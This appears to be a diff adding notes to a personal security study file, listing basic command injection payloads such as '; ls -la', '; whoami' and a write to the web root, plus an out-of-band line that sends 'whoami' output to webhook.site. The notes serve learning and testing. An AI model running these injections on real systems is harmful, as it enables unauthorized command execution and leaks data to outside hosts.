@@ -2199,3 +2199,23 @@ how it works:
 		- the result
 		- ![[Pasted image 20240308114321.png]]
 
+- open the [[cheet#AppSecExplained|App Sec explained]] -->  and check for Injection > Command Injection
+
+<span style="background:#fff88f">basic command injection:</span>
+`; ls -la`
+`&& ls -la`
+`; ls -la #`
+`| ls -la`
+```bash
+; sleep 10
+; ping -c 10 127.0.0.1
+& whoami > /var/www/html/whoami.txt &
+```
+
+```bash
+& nslookup webhook.site/<id>?`whoami` &     -->  out of band testing
+```
+
+=>
+let's try the first one
+`; whoami`
